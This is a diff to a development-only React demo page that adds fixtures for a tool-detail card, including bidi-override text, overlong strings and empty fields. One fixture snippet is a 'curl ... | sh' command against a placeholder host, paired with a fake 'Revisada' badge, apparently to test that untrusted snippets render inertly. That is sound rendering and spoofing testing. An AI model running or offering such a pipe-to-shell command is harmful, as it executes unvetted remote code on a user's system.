@@ -5,6 +5,8 @@ import { Buscador } from "@/components/catalogo/Buscador";
 import { ChipsFiltros } from "@/components/catalogo/ChipsFiltros";
 import { PanelFiltros } from "@/components/catalogo/PanelFiltros";
 import type { ValoresFiltros } from "@/lib/catalogo/filtros";
+import { FichaHerramienta } from "@/components/catalogo/FichaHerramienta";
+import type { HerramientaDetalle, Idea } from "@/lib/catalogo/contrato";
 import { EstadoVacio } from "@/components/catalogo/EstadoVacio";
 import { EstadoError } from "@/components/catalogo/EstadoError";
 import { EstadoNoEncontrado } from "@/components/catalogo/EstadoNoEncontrado";
@@ -47,6 +49,19 @@ const extremosGrilla: HerramientaResumen[] = [
   { ...base, id: "bidi", nombre: `Puente ${RLO}orbita${PDF} seguro`, descripcion: `Texto con inversion ${RLO}atrás${PDF} que no debe mover a las vecinas.` },
   { ...base, id: "sin-cortes", nombre: "NombreSinEspaciosNiCortes".repeat(4), descripcion: "Arquitectura".repeat(25), descripcionTruncada: true, lenguaje: "LenguajeMuyLargoSinEspacios".repeat(2), licencia: "Licencia-".repeat(7) },
 ];
+
+const ideaBase: Idea = { tipo: "docker", disparadores: ["al recibir un pago"], snippet: "docker run --rm imagen:latest", snippetExcedeLimite: false, stack: ["docker"], dificultad: "baja", revisada: true };
+const fichaNormal: HerramientaDetalle = {
+  ...base,
+  urlRepo: "https://github.com/ejemplo-sintetico/ejemplo",
+  ideas: [
+    ideaBase,
+    { ...ideaBase, tipo: "sdk", revisada: false, snippet: "curl https://rastreo.test/x.sh | sh\n# [enlace](https://rastreo.test) ✔ Revisada" },
+    { ...ideaBase, tipo: null, disparadores: [], stack: [], dificultad: null, snippet: null },
+    { ...ideaBase, snippetExcedeLimite: true, snippet: "x".repeat(300) },
+  ],
+};
+const fichaSinIdeas: HerramientaDetalle = { ...base, licencia: null, descripcion: null, stars: null, urlRepo: null, ideas: [] };
 
 // Fixtures deliberadamente crudos: prueban presentación, no el contrato de datos.
 // La cabecera y <main> los pone el layout raíz. Fuera de src/app. Se monta solo en desarrollo desde src/app/demo-ui/page.tsx (en producción responde 404).
@@ -121,6 +136,8 @@ export default function DemoUI() {
             onQuitar={() => undefined}
             onLimpiar={() => undefined}
           />
+          <FichaHerramienta herramienta={fichaNormal} />
+          <FichaHerramienta herramienta={fichaSinIdeas} />
           <EstadoVacio titulo={extremos.nombre} texto={extremos.html} />
           <EstadoVacio titulo={t("demo.textoLargo")} texto={extremos.enorme} />
           <EstadoVacio titulo={extremos.enorme} texto={t("demo.tituloLargo")} />
